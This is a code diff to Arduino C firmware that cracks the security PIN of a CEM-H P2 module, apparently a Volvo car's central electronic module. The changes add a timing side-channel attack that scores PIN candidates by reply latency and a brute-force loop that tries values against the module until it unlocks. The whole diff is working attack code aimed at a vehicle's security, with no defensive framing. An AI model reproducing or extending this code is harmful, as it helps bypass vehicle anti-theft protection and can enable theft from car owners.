@@ -4,9 +4,11 @@
  */
 
 #include "cem_cracker_optimized.h"
+#include <Arduino.h>
+#include <math.h>
 
-// CEM-H P2 part numbers for quick identification
-const uint32_t CEM_H_P2_PARTS[] = {
+// CEM-H P2 part numbers database
+static const uint32_t CEM_H_P2_PARTS[] = {
     30786476, 30728539, 30682982, 30728357, 30765148,
     30765643, 30786476, 30786890, 30795115, 31282455,
     31394157, 30786579
@@ -26,12 +28,16 @@ bool is_cem_h_p2(uint32_t part_number) {
 // Optimize parameters specifically for CEM-H P2
 void optimize_cem_h_parameters(void) {
     // Adjust timing parameters
-    cem_reply_min = cem_reply_avg * CEM_H_REPLY_MIN_FACTOR;
-    cem_reply_max = cem_reply_avg * CEM_H_REPLY_MAX_FACTOR;
+    cem_reply_min = (uint32_t)(cem_reply_avg * CEM_H_REPLY_MIN_FACTOR);
+    cem_reply_max = (uint32_t)(cem_reply_avg * CEM_H_REPLY_MAX_FACTOR);
     
-    // Set optimal sampling rates based on empirical testing
-    samples_first_position = MAX_SAMPLES_FIRST_POSITION;
-    samples_other_positions = MIN_SAMPLES_PER_BATCH;
+    // Set shuffle order for CEM-H P2 (3,1,5,0,2,4)
+    shuffle_order[0] = 3;
+    shuffle_order[1] = 1;
+    shuffle_order[2] = 5;
+    shuffle_order[3] = 0;
+    shuffle_order[4] = 2;
+    shuffle_order[5] = 4;
 }
 
 // Calculate confidence score for PIN attempt
@@ -41,14 +47,15 @@ double calculate_confidence_score(const pin_statistics *stats) {
     }
     
     // Calculate confidence based on latency distribution
-    double normalized_latency = stats->mean_latency / cem_reply_avg;
+    double normalized_latency = stats->mean_latency / (double)cem_reply_avg;
     double latency_score = 1.0 - (normalized_latency - CEM_H_REPLY_MIN_FACTOR) / 
                           (CEM_H_REPLY_MAX_FACTOR - CEM_H_REPLY_MIN_FACTOR);
     
     // Weight by sample consistency
     double consistency = 1.0 - (stats->std_deviation / stats->mean_latency);
     
-    return latency_score * consistency * (stats->valid_samples / (double)MAX_SAMPLES_FIRST_POSITION);
+    return latency_score * consistency * 
+           (stats->valid_samples / (double)MAX_SAMPLES_FIRST_POSITION);
 }
 
 // Process a batch of PIN attempts
@@ -117,7 +124,7 @@ bool should_terminate_early(const pin_statistics *stats) {
     return false;
 }
 
-// Optimized PIN cracking sequence for CEM-H P2
+// Main PIN cracking function for CEM-H P2
 bool crack_cem_h_p2_pin(uint8_t *pin) {
     optimize_cem_h_parameters();
     
@@ -140,6 +147,7 @@ bool crack_cem_h_p2_pin(uint8_t *pin) {
             
             // Update display
             lcd_spinner();
+            lcd_printf(0, 1, "Pos %lu: %d%%", pos, (i + 1) * 10);
         }
         
         // Find batch with highest confidence
@@ -156,8 +164,29 @@ bool crack_cem_h_p2_pin(uint8_t *pin) {
         // Set PIN digit from best batch
         pin[pos] = binToBcd((batches[best_batch].start_value + 
                             batches[best_batch].end_value) / 2);
+                            
+        lcd_printf(0, 0, "PIN[%lu]=%02X", pos, pin[pos]);
     }
     
-    // Remaining positions use standard cracking with optimized parameters
-    return crack_remaining_positions(pin, 2);
+    // Remaining positions use brute force with early termination
+    for (uint32_t pos = 2; pos < PIN_LEN; pos++) {
+        for (uint8_t val = 0; val < 100; val++) {
+            if (abortReq) return false;
+            
+            pin[pos] = binToBcd(val);
+            uint32_t latency;
+            
+            if (cemUnlock(pin, NULL, &latency, false)) {
+                lcd_printf(0, 0, "PIN[%lu]=%02X", pos, pin[pos]);
+                return true;
+            }
+            
+            if ((val % 10) == 0) {
+                lcd_printf(0, 1, "Pos %lu: %d%%", pos, val);
+                lcd_spinner();
+            }
+        }
+    }
+    
+    return false;
 }
